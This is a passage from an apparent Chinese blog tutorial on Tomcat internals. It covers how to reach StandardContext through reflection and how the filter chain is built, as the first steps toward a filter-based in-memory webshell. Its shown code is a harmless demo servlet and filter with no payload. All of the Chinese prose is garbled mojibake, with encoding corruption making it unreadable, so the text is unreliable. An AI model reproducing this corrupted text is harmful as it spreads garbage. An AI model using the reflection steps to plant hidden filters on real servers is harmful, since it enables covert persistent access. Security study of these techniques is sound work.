<p>ä»¥ServletRequestListenerä¸ºä¾‹ï¼ŒServletRequestListenerä¸»è¦ç”¨äºç›‘å¬ServletRequestå¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯,ä¸€ä¸ªServletRequestå¯ä»¥æ³¨å†Œå¤šä¸ªServletRequestListeneræ¥å£ã€‚</p>
<ul>
<li>æ¯æ¬¡è¯·æ±‚åˆ›å»ºæ—¶è°ƒç”¨<code>requestInitialized()</code>ã€‚</li>
<li>æ¯æ¬¡è¯·æ±‚é”€æ¯æ—¶è°ƒç”¨<code>requestDestroyed()</code>ã€‚</li>
</ul>
<h4 id="servletcontextä¸standardcontextçš„å…³ç³»">ServletContextä¸StandardContextçš„å…³ç³»<a hidden class="anchor" aria-hidden="true" href="#servletcontextä¸standardcontextçš„å…³ç³»">#</a></h4>
<p>å½“ Web å®¹å™¨å¯åŠ¨çš„æ—¶å€™ä¼šä¸ºæ¯ä¸ª Web åº”ç”¨éƒ½åˆ›å»ºä¸€ä¸ª ServletContext å¯¹è±¡ï¼Œä»£è¡¨å½“å‰ Web åº”ç”¨ã€‚</p>
<p>Tomcatä¸­å¯¹åº”çš„ServletContextå®ç°æ˜¯ApplicationContextã€‚</p>
<p>åœ¨Webåº”ç”¨ä¸­è·å–çš„ServletContextå®é™…ä¸Šæ˜¯ApplicationContextFacadeå¯¹è±¡ï¼Œå¯¹ApplicationContextè¿›è¡Œäº†å°è£…ï¼Œè€ŒApplicationContextå®ä¾‹ä¸­åˆåŒ…å«äº†StandardContextå®ä¾‹ï¼Œä»¥æ­¤æ¥è·å–æ“ä½œTomcatå®¹å™¨å†…éƒ¨çš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚Servletçš„æ³¨å†Œç­‰ã€‚</p>
<p>é€šè¿‡ä¸‹é¢çš„å›¾å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°ä¸¤è€…ä¹‹é—´çš„å…³ç³»ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415151111820.png" alt="image-20230415151111820"  />
</p>
<h5 id="å¦‚ä½•è·å–standardcontext">å¦‚ä½•è·å–StandardContext<a hidden class="anchor" aria-hidden="true" href="#å¦‚ä½•è·å–standardcontext">#</a></h5>
<ul>
<li>
<p>ç”±ServletContextè½¬StandardContextï¼Œå¦‚æœå¯ä»¥ç›´æ¥è·å–åˆ°requestå¯¹è±¡çš„è¯å¯ä»¥ç”¨è¿™ç§æ–¹æ³•</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Field applicationContextField = ApplicationContextFacade.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;context&#34;</span>);
</span></span><span style="display:flex;"><span>applicationContextField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>Field standardContextField = ApplicationContext.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;context&#34;</span>);
</span></span><span style="display:flex;"><span>standardContextField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServletContext servletContext = servletRequest.<span style="color:#007f7f">getServletContext</span>();
</span></span><span style="display:flex;"><span>ApplicationContext applicationContext= (ApplicationContext) applicationContextField.<span style="color:#007f7f">get</span>(servletContext);
</span></span><span style="display:flex;"><span>StandardContext standardContext = (StandardContext) standardContextField.<span style="color:#007f7f">get</span>(applicationContext);
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<ul>
<li>
<p>servletç¯å¢ƒçš„requestå®é™…ä¸Šä¸ºRequestFacadeå¯¹è±¡ï¼Œå®ƒçš„requestå±æ€§å­˜å‚¨äº†Requestå¯¹è±¡ï¼ŒRequestå¯¹è±¡çš„getContextèƒ½ç›´æ¥æ‹¿åˆ°Context</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415153918650.png" alt="image-20230415153918650"  />
</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Field requestField = servletRequest.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;request&#34;</span>);
</span></span><span style="display:flex;"><span>requestField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>Request request1 = (Request) requestField.<span style="color:#007f7f">get</span>(request);
</span></span><span style="display:flex;"><span>StandardContext standardContext = (StandardContext) request1.<span style="color:#007f7f">getContext</span>();
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="å†…å­˜é©¬">å†…å­˜é©¬<a hidden class="anchor" aria-hidden="true" href="#å†…å­˜é©¬">#</a></h2>
<h3 id="filterå†…å­˜é©¬">Filterå†…å­˜é©¬<a hidden class="anchor" aria-hidden="true" href="#filterå†…å­˜é©¬">#</a></h3>
<h4 id="æ³¨å†Œæµç¨‹">æ³¨å†Œæµç¨‹<a hidden class="anchor" aria-hidden="true" href="#æ³¨å†Œæµç¨‹">#</a></h4>
<p>æ³¨å†Œä¸€ä¸ª<code>Servlet</code>ï¼Œurl-patterä¸º<code>/test</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> servlet;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.ServletException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.annotation.WebServlet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.http.HttpServlet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.http.HttpServletRequest;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.http.HttpServletResponse;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName TestServlet
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/8 19:20
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> TestServlet <span style="color:#fff;font-weight:bold">extends</span> HttpServlet {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">protected</span> <span style="color:#fff;font-weight:bold">void</span> doPost(HttpServletRequest req, HttpServletResponse resp) <span style="color:#fff;font-weight:bold">throws</span> ServletException, IOException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        resp.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">append</span>(<span style="color:#0ff;font-weight:bold">&#34;Hello,This is Test&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">protected</span> <span style="color:#fff;font-weight:bold">void</span> doGet(HttpServletRequest req, HttpServletResponse resp) <span style="color:#fff;font-weight:bold">throws</span> ServletException, IOException {
</span></span><span style="display:flex;"><span>        resp.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">append</span>(<span style="color:#0ff;font-weight:bold">&#34;Hello,This is Test&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// super.doGet(req, resp);
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>è‡ªå®šä¹‰<code>Filter</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> filter;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.*;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName DemoFilter
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/8 19:27
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> DemoFilter <span style="color:#fff;font-weight:bold">implements</span> Filter {
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> init(FilterConfig filterConfig) <span style="color:#fff;font-weight:bold">throws</span> ServletException {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;Filter åˆå§‹åŒ–åˆ›å»º&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> destroy() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) <span style="color:#fff;font-weight:bold">throws</span> ServletException, IOException {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;æ‰§è¡Œè¿‡æ»¤æ“ä½œ!&#34;</span>);
</span></span><span style="display:flex;"><span>        filterChain.<span style="color:#007f7f">doFilter</span>(servletRequest,servletResponse);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¿®æ”¹<code>web.xml</code>æŒ‡å®š<code>Servlet</code>ï¼Œ<code>Filter</code>çš„url-pattterä¸º<code>/test</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415160051922.png" alt="image-20230415160051922"  />
</p>
<h4 id="filterè°ƒç”¨é“¾">Filterè°ƒç”¨é“¾<a hidden class="anchor" aria-hidden="true" href="#filterè°ƒç”¨é“¾">#</a></h4>
<p>é¦–å…ˆè®²ä¸€ä¸‹ä¸€äº›åŸºç¡€çš„ç±»ï¼š</p>
<p><strong>FilterDefs</strong>ï¼šå­˜æ”¾FilterDefçš„æ•°ç»„ ï¼Œ<strong>FilterDef</strong> ä¸­å­˜å‚¨ç€æˆ‘ä»¬ FilterNameï¼ŒFilterå¯¹åº”ç±»ç­‰åŸºæœ¬ä¿¡æ¯</p>
<p><strong>FilterConfigs</strong>ï¼šå­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ <strong>FilterConfig</strong> ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯</p>
<p><strong>FilterMaps</strong>ï¼šå­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ <strong>FilterMap</strong> ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern</p>
<p><strong>FilterChain</strong>ï¼šè¿‡æ»¤å™¨é“¾ï¼Œè¯¥å¯¹è±¡ä¸Šçš„ doFilter æ–¹æ³•èƒ½ä¾æ¬¡è°ƒç”¨é“¾ä¸Šçš„ Filter</p>
<p>åœ¨<code> StandardWrapperValve</code> ä¸­ä¼šåˆ©ç”¨ <code>ApplicationFilterFactory </code>æ¥åˆ›å»ºfilterChainï¼ˆfilteré“¾ï¼‰,è·Ÿè¿›<code>createFilterChain</code>æ–¹æ³•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415161204437.png" alt="image-20230415161204437"  />
</p>
<p>åœ¨<code>createFilterchain</code>æ–¹æ³•ä¸­å…ˆé€šè¿‡<code>wrapper.getParent()</code>è·å¾—å½“å‰çš„<code>StandardContext</code>ï¼Œç„¶åä»contextä¸­è·å–<code>FilterMaps</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415162211826.png" alt="image-20230415162211826"  />
</p>
<p>æ¥ç€<code>createChain</code>æ–¹æ³•ä¼šéå† FilterMaps ä¸­çš„ FilterMapï¼Œå¦‚æœå‘ç°ç¬¦åˆå½“å‰è¯·æ±‚ url ä¸ FilterMap ä¸­çš„ urlPattern ç›¸åŒ¹é…ï¼Œå°±ä¼šè¿›å…¥ if åˆ¤æ–­ï¼Œè°ƒç”¨ findFilterConfig æ–¹æ³•åœ¨ filterConfigs ä¸­å¯»æ‰¾å¯¹åº” filterNameåç§°çš„ FilterConfigï¼Œç„¶åå¦‚æœä¸ä¸ºnullï¼Œå°±è¿›å…¥ if åˆ¤æ–­ï¼Œå°† filterConfig æ·»åŠ åˆ° filterChainä¸­ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415164106484.png" alt="image-20230415164106484"  />
</p>
<p>ä¸Šè¿°å¦‚æœè·å–åˆ°çš„<code>filterConfig</code>ä¸ä¸ºnullçš„è¯ï¼Œå°±è°ƒç”¨<code>org.apache.catalina.core.ApplicationFilterChain#addFilter</code>æ–¹æ³•å°†å½“å‰Filteræ·»åŠ åˆ°<code>FilterChain</code>ä¸Šé¢ã€‚</p>
<p>é¦–å…ˆä¼šéå†filtersï¼Œåˆ¤æ–­æˆ‘ä»¬çš„filteræ˜¯å¦å·²ç»å­˜åœ¨ï¼ˆå…¶å®å°±æ˜¯å»é‡ï¼‰ï¼Œæ¥ä¸‹æ¥çš„ if åˆ¤æ–­å°±æ˜¯æ‰©å®¹ï¼Œå¦‚æœ n å·²ç»ç­‰äºå½“å‰ filters çš„é•¿åº¦äº†å°±å†æ·»åŠ 10ä¸ªå®¹é‡ï¼Œæœ€åå°†æˆ‘ä»¬çš„filterConfig æ·»åŠ åˆ° filtersä¸­ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415164532159.png" alt="image-20230415164532159"  />
</p>
<p>è‡³æ­¤ filterChain ç»„è£…å®Œæ¯•ï¼Œé‡æ–°å›åˆ° <code>StandardContextvalve </code>ä¸­ï¼Œè°ƒç”¨ filterChain çš„ doFilter æ–¹æ³•,è·Ÿè¿›è¯¥æ–¹æ³•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415164923882.png" alt="image-20230415164923882"  />
</p>
<p>åœ¨<code>doFilter</code>æ–¹æ³•å®é™…ä¸Šè°ƒç”¨<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>æ–¹æ³•</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415165044609.png" alt="image-20230415165044609"  />
</p>
<p>åœ¨<code>internalDoFilter</code>æ–¹æ³•ä¸­é¦–å…ˆä¼šä¾æ¬¡ä» <code>filters</code> ä¸­å–å‡º<code> filterConfig</code></p>
<p>ç„¶åä¼šè°ƒç”¨ <code>getFilter() </code>å°† filter ä» filterConfig ä¸­å–å‡ºï¼Œè°ƒç”¨ filter çš„ doFilteræ–¹æ³•</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415165553775.png" alt="image-20230415165553775"  />
</p>
<p>æœ€åè°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰è¿‡æ»¤å™¨çš„<code>doFilter</code>æ–¹æ³•ï¼Œè§¦å‘ä»£ç ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415165624122.png" alt="image-20230415165624122"  />
</p>
<p>åšä¸€ä¸ªç®€å•çš„æµç¨‹æ€»ç»“ï¼š</p>
<ol>
<li>è·å–å½“å‰çš„<code>StandardContext</code>,ä»ä¸­è·å–å½“å‰çš„<code>FilterMaps</code></li>
<li>æ ¹æ®è¯·æ±‚çš„ URL ä» <code>FilterMaps</code> ä¸­æ‰¾å‡ºä¸ä¹‹ URL å¯¹åº”çš„ FilterName</li>
<li>æ ¹æ® FilterNameå» <code>FilterConfigs</code> ä¸­å¯»æ‰¾å¯¹åº”åç§°çš„ FilterConfig</li>
<li>æ‰¾åˆ°å¯¹åº”çš„ FilterConfig ä¹‹åæ·»åŠ åˆ° FilterChainä¸­ï¼Œå¹¶ä¸”è¿”å› FilterChain</li>
<li>FilterChain ä¸­è°ƒç”¨ internalDoFilter éå†è·å– chain ä¸­çš„ FilterConfig ï¼Œç„¶åä» FilterConfig ä¸­è·å– Filterï¼Œç„¶åè°ƒç”¨ Filter çš„ doFilter æ–¹æ³•</li>
</ol>
